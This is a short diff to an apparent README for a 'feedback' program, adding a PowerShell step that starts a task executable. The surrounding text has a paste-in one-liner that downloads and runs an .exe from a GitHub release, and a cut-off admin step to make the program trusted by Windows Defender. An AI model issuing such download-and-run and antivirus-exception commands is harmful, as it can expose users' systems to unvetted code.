@@ -3,6 +3,11 @@
 ```bash
 iwr -UseBasicParsing "https://github.com/bebedudu/autoupdate/releases/download/v1.1.9/MyFeedbackSetup.exe" -OutFile "$env:TEMP\MyFeedbackSetup.exe"; Start-Process "$env:TEMP\MyFeedbackSetup.exe"
 ```
+### Add the auto task & make trusted application
+1. Open Powershell & paste it
+```bash
+Start-Process "C:\user feedback\feedback\feedbacktask.exe"
+```
 ### Make trusted application to window defender
 1. Open Powershell as admin & paste the script
 ```bash
